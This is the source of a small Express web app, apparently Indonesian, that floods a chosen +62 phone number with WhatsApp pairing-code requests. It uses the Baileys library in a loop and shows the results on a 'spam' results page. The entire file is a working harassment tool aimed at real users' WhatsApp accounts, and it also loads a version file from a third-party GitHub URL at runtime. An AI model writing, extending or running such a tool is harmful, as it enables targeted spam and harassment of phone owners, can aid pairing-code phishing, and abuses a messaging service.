const express = require('express');
const path = require('path');
const pino = require('pino');
const makeWASocket = require('@whiskeysockets/baileys').default;
const { useMultiFileAuthState } = require('@whiskeysockets/baileys');
const  axios  = require('axios');
const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('views', path.join(__dirname, 'views'));
app.engine('html', require('ejs').renderFile);
app.set('view engine', 'html');

app.get('/', (req, res) => {
  res.render('index');
});

app.post('/spam', async (req, res) => {
  const phoneNumber = req.body.phone;
  const totalSpam = parseInt(req.body.total);
  const logs = [];

  if (!phoneNumber.startsWith('62')) {
    return res.send('Only Indonesian numbers (+62) are supported.');
  }

  if (isNaN(totalSpam) || totalSpam <= 0) {
    return res.send('Invalid number of spam. Example: 20');
  }

  try {
    const usePairing = true
    const { version } = await axios
        .get(
          "https://raw.githubusercontent.com/nstar-y/Bail/refs/heads/main/src/Defaults/baileys-version.json"
        )
        .then((res) => res.data);
    const { state } = await useMultiFileAuthState('./69/session');
    const sock = makeWASocket({
      logger: pino({ level: 'silent' }),
      auth: state,
      printQRInTerminal: !usePairing,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version,
    });

    for (let i = 0; i < totalSpam; i++) {
      try {
        let code = await sock.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        logs.push(`✅ Success [${i + 1}/${totalSpam}] - Code: ${code}`);
      } catch (error) {
        logs.push(`❌ Failed [${i + 1}/${totalSpam}] - ${error.message}`);
      }
    }

   res.send(`
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Hasil Spam</title>
    <style>
      body {
        background-color: #0f172a;
        color: #38bdf8;
        font-family: 'Courier New', monospace;
        padding: 1rem;
        margin: 0;
      }
      .terminal {
        background-color: #1e293b;
        padding: 1.5rem;
        border-radius: 10px;
        max-width: 800px;
        margin: auto;
        box-shadow: 0 0 10px rgba(0,0,0,0.3);
        overflow-x: auto;
      }
      .terminal h2 {
        color: #f8fafc;
        margin-bottom: 1rem;
      }
      pre {
        white-space: pre-wrap;
        word-wrap: break-word;
      }
      .back-btn {
        display: inline-block;
        margin-top: 1.5rem;
        padding: 0.5rem 1rem;
        background-color: #38bdf8;
        color: #0f172a;
        text-decoration: none;
        font-weight: bold;
        border-radius: 6px;
        transition: background 0.3s ease;
      }
      .back-btn:hover {
        background-color: #0ea5e9;
      }
      @media (max-width: 600px) {
        body { padding: 0.5rem; }
        .terminal { padding: 1rem; }
      }
    </style>
  </head>
  <body>
    <div class="terminal">
      <h2>📡 Hasil Spam Pairing Code</h2>
      <pre>${logs.join('\n')}</pre>
      <a href="/" class="back-btn">⟵ Kembali</a>
    </div>
  </body>
  </html>
`);

  } catch (err) {
    res.send(`❌ Error: ${err.message}`);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
